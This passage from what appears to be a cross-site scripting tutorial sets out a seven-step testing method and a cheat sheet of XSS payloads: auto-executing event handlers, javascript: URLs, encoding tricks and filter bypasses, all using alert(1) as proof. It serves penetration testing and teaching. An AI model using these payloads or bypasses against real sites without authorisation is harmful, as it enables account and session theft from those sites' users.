│  - alert blocked      │ confirm(1), prompt(1), console.log(1)           │
│  - script blocked     │ <img src=x onerror=alert(1)>                    │
└─────────────────────────────────────────────────────────────────────────┘
Part 10: Testing Methodology
text

┌─────────────────────────────────────────────────────────────────────────┐
│                    XSS TESTING METHODOLOGY                              │
└─────────────────────────────────────────────────────────────────────────┘

STEP 1: IDENTIFY INPUT POINTS
─────────────────────────────
• URL parameters (?name=value)
• Form fields (search, login, comments)
• Headers (User-Agent, Referer, Cookie)
• File uploads (SVG, HTML files)
• JSON/XML data
• WebSocket messages

STEP 2: IDENTIFY OUTPUT POINTS
──────────────────────────────
• Where does input appear in response?
• In HTML body?
• In HTML attributes?
• In JavaScript code?
• In CSS?
• In comments?

STEP 3: TEST WITH PROBE
───────────────────────
• Send: test<>'"
• Check response: Are characters encoded?
• < becomes &lt;  (encoded - harder to exploit)
• < stays <      (not encoded - exploitable)

STEP 4: DETERMINE CONTEXT
─────────────────────────
See where probe appears:
• <div>test<>'"</div>          → HTML context
• <input value="test<>'"">     → Attribute context
• <script>var x="test<>'"</script> → JS context

STEP 5: CRAFT CONTEXT-SPECIFIC PAYLOAD
──────────────────────────────────────
Use appropriate payload from this guide based on context

STEP 6: TEST FILTER BYPASSES
────────────────────────────
If blocked:
• Try encoding (HTML entities, URL encoding)
• Try case variations
• Try alternative tags/events
• Try polyglot payloads

STEP 7: VERIFY IMPACT
─────────────────────
• Does alert() fire?
• Can you access document.cookie?
• Can you make external requests?
• Document and report!
Cheat Sheet Summary
text

╔═══════════════════════════════════════════════════════════════════════╗
║                    XSS CHEAT SHEET SUMMARY                            ║
╠═══════════════════════════════════════════════════════════════════════╣
║ BASIC TESTS:                                                          ║
║   <script>alert(1)</script>                                           ║
║   <img src=x onerror=alert(1)>                                        ║
║   <svg onload=alert(1)>                                               ║
║   <body onload=alert(1)>                                              ║
╠═══════════════════════════════════════════════════════════════════════╣
║ EVENT HANDLERS:                                                       ║
║   onerror, onload, onclick, onfocus, onmouseover,                     ║
║   onmouseenter, oninput, onchange, onblur, ondrag,                    ║
║   ontoggle, onanimationstart, onwheel, onpointerenter                 ║
╠═══════════════════════════════════════════════════════════════════════╣
║ AUTO-EXECUTE (no click needed):                                       ║
║   <svg onload=alert(1)>                                               ║
║   <body onload=alert(1)>                                              ║
║   <input onfocus=alert(1) autofocus>                                  ║
║   <marquee onstart=alert(1)>                                          ║
║   <details open ontoggle=alert(1)>                                    ║
╠═══════════════════════════════════════════════════════════════════════╣
║ JAVASCRIPT PROTOCOL:                                                  ║
║   <a href="javascript:alert(1)">                                      ║
║   <iframe src="javascript:alert(1)">                                  ║
║   <form action="javascript:alert(1)">                                 ║
╠═══════════════════════════════════════════════════════════════════════╣
║ ENCODING:                                                             ║
║   HTML: &#97;&#108;&#101;&#114;&#116; = alert                         ║
║   JS:   \u0061\u006C\u0065\u0072\u0074 = alert                        ║
║   URL:  %3Cscript%3E = <script>                                       ║
╠═══════════════════════════════════════════════════════════════════════╣
║ FILTER BYPASS:                                                        ║
║   No parentheses: alert`1`                                            ║
║   No quotes: alert(1) or alert(/XSS/.source)                          ║
║   No spaces: <svg/onload=alert(1)>                                    ║
║   String concat: eval('al'+'ert(1)')                                  ║
╚═══════════════════════════════════════════════════════════════════════╝
